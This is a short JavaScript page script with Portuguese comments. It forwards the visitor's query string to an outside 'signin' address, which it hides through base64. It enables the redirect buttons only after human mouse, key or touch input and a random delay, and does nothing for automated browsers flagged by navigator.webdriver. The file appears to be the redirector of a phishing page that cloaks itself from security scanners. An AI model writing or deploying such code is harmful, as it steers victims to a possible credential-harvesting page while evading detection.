// Captura a query string atual
const params = window.location.search.substring(1);

// URL base
const redirectUrlBase = "https://signin.qedpartner.com/auth";

// Monta URL final
let redirectUrlFinal = redirectUrlBase;

if (params) {
    redirectUrlFinal += (redirectUrlFinal.includes("?") ? "&" : "?") + params;
}

// Equivalente ao base64_encode
const encodedRedirectUrl = btoa(redirectUrlFinal);

// Equivalente ao JavaScript gerado pelo PHP
document.addEventListener("DOMContentLoaded", function () {
    const redirectUrl = atob(encodedRedirectUrl);

    function enableButtons() {
        document.querySelectorAll(".btn").forEach(function (btn) {
            btn.addEventListener("click", function () {
                window.location.href = redirectUrl;
            });
        });
    }

    function init() {
        if (navigator.webdriver || !navigator.userAgent) {
            return;
        }

        const delay = Math.floor(Math.random() * 1000) + 500;
        setTimeout(enableButtons, delay);
    }

    document.addEventListener("mousemove", init, { once: true });
    document.addEventListener("keydown", init, { once: true });
    document.addEventListener("touchstart", init, { once: true });
});
